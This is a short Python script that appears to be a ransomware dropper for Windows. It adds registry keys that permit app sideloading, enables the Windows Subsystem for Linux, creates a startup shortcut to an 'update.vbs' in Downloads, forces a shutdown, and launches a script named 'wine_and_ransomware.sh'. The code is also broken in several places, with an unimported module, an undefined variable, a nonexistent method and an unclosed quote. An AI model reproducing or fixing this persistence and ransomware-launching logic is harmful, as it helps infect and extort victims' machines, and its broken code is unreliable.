#!/usr/bin/env python3

from os import system
import time
from pathlib import Path


def find(name, path):
    for dirpath, dirnames, filenames in os.walk(path, topdown=False):
        for dirname in dirnames:
            if dirname == name:
                return os.path.join(dirpath, name)


def walklevel(some_dir, name, level=0):
    some_dir = some_dir.rstrip(os.path.sep)
    assert os.path.isdir(some_dir)
    num_sep = some_dir.count(os.path.sep)
    for dirpath, dirnames, filenames in os.walk(some_dir):
        for dirname in dirnames:
            num_sep_this = dirpath.count(os.path.sep)
            if num_sep + level <= num_sep_this:
                return os.path.join(dirpath, name)

autorun = Path("C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\autorun.lnk")

if autorun.isfile():
    system("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock\AllowAllTrustedApps")
    system("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock\AllowDevelopmentWithoutDevlicense")
    os.system('bash -c "~/wine_and_ransomware.sh')

else:
    a = find('System32', 'C:/')
    print(a)
    b = walklevel(a, 'drivers')
    print(b)

    lxcore = Path(b + "\lxcore.sys")
    print(lxss)

    if lxcore.is_file() and lxss.is_file():
        print("linux subsystem is turned on")
    else:
        print("linux subsystem is turned off")
        system("DISM/online/enable-feature/featurename:Microsoft-Windows-subsystem-Linux")
        os.system('shortcut.exe /c:"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\autorun.lnk" /a:c  /c:%USERPROFILE%\Download\update.vbs')
        os.system('shutdown -s -f -t 00')

time.sleep(5)




